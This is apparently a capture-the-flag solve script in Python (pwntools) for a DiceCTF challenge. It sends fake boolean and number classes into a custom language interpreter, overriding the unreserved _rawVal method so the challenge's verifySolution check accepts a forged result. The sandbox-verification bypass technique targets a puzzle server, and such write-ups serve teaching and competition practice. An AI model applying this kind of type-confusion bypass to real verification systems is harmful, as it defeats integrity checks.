from pwn import *

# s = process(['python3', 'server.py'])
# s = remote('dicec.tf', 31084)
s = remote('localhost', 5000)

# The intended solution abuses polymorphism and reimplements the
# _rawVal() method to propagate boolean values using a fake boolean class.
# This works because _rawVal is not a reserved keyword like it should've been.
user_code = """
    class TrapBoolean {
        constructor(inner) {
            let this.inner = inner;
        }

        fn _rawVal() {
            return this.inner._rawVal();
        }

        fn and(other) {
            return this;
        }
    }

    class TrapNumber {
        constructor(inner) {
            let this.inner = inner;
        }

        fn _rawVal() {
            return this.inner._rawVal();
        }

        fn notEquals(other) {
            return new TrapBoolean(true);
        }
    }

    let chall = new Challenge();
    return chall.verifySolution(new TrapNumber(0), 0, 0);
"""

s.recvuntil("Enter lines of code, with the last line containing only the string 'EOF': ")
s.sendline(user_code)
s.sendline("EOF")

s.recvuntil("Running your code...")
print(s.recvall().decode())
